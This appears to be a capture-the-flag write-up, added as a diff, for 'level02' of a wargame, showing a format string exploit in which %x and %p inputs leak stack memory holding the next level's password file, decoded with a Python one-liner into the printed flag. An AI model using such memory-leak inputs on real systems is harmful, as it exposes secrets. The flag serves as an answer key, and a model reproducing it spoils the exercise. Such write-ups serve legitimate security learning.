@@ -1,0 +1,63 @@
+level02
+
+----- STRINGS -----
+
+/home/users/level03/.pass
+ERROR: failed to open password file
+ERROR: failed to read password file
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username:
+--[ Password:
+*****************************************
+Greetings, %s!
+/bin/sh
+does not have access!
+
+----- EXEC -----
+
+1) dat_wil does not have access!
+
+--[ Username: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+--[ Password: *****************************************
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2 does not have access!
+
+2) we can see an anomally here, Username is printing the Buffer overflow pattern in password, lets check for printf err
+
+--[ Username: AAAA %s %s %s
+--[ Password:
+*****************************************
+AAAA  (null) (null)  does not have access!
+
+3) Here i realise that we can prints address with printf, same like rainfall
+
+AAAA %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d
+AAAA -6928 0 65 707406378 707406378 -6424 -134243832 1094795585 622879781 543434016 1680154724 622879781 543434016 1680154724 622879781 543434016 1680154724 622879781 543434016 2433124 0 876046408 1634941265 1464756056 1850169459 1716205901 0  does not have access!
+
+AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
+AAAA ffffe4f0 0 41 2a2a2a2a 2a2a2a2a ffffe6e8 f7ff9a08 41414141 25207825 20782520 78252078 25207825 20782520 78252078 25207825 20782520 78252078 25207825 0 0 0 34376848 61733951 574e6758 6e475873 664b394d 0 does not have access!
+
+4) After printing different ways and try to use the numer 3 and 8 address that are edited (41414141) i go to gdb and saw that is a 64 bits executable, so let's go and try %p and check again the address
+
+AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
+AAAA 0x7fffffffe4f0 (nil) 0x70 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6e8 0x1f7ff9a08 0x2070252070252070 0x7025207025207025 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) 0x2070252041414141 0x7025207025207025 0x2520702520702520 0x2070252070252070  does not have access!
+
+5) we can see that fopen is trying to open "/home/users/level03/.pass" so from the beggining of the buffer 0x100000000 we can see 5 Address: 
+
+0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d 
+
+6) we know swell that username is passing 64 bytes format and password go to give us what we have inside the filename, so let's go and transform this address on little endian
+
+----- r2 -----
+
+(python -c 'print "\x48\x68\x37\x34\x52\x50\x6e\x75" + "\x51\x39\x73\x61\x35\x4a\x41\x45" + "\x58\x67\x4e\x57\x43\x71\x7a\x37" + "\x73\x58\x47\x6e\x68\x35\x4a\x35" + "\x4d\x39\x4b\x66\x50\x67\x33\x48"';) > /tmp/level02
+
+Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H does not have access!
+
+7) so we get that maybe is our password we can check and we have access.
+
+----- FLAG -----
+
+Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
